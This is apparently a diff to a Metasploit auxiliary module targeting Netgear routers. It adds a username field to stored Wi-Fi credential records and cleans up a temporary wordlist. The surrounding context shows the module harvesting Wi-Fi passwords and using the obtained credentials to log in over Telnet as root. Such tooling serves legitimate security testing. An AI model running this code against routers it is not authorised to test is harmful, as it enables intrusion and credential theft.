@@ -151,6 +151,7 @@ class MetasploitModule < Msf::Auxiliary
         module_fullname: fullname,
         workspace_id: myworkspace_id,
         filename: "wifi_#{wifi_ssid_5g}_creds.txt",
+        username: wifi_ssid_5g,
         private_data: wifi_password_5g,
         private_type: :password
       }
@@ -167,6 +168,7 @@ class MetasploitModule < Msf::Auxiliary
         module_fullname: fullname,
         workspace_id: myworkspace_id,
         filename: "wifi_#{wifi_ssid}_creds.txt",
+        username: wifi_ssid,
         private_data: wifi_password,
         private_type: :password
       }
@@ -239,11 +241,13 @@ class MetasploitModule < Msf::Auxiliary
     print_good('Telnet enabled on target router!')
     handler = framework.modules.create('auxiliary/scanner/telnet/telnet_login')
     handler.datastore['RHOSTS'] = datastore['RHOST']
+    File.delete('netgear_pnpx_wordlist.txt') if File.exist?('netgear_pnpx_wordlist.txt') # Make sure the file is deleted if it already exists.
     file_handle = File.open('netgear_pnpx_wordlist.txt', 'wb')
     file_handle.write("#{username} #{password}")
     file_handle.close
     handler.datastore['USERPASS_FILE'] = 'netgear_pnpx_wordlist.txt'
     print_status("Attempting to log in with #{username}:#{password}. You should get a new telnet session as the root user")
     handler.run
+    File.delete('netgear_pnpx_wordlist.txt') if File.exist?('netgear_pnpx_wordlist.txt') # Remove the file once we are done.
   end
 end
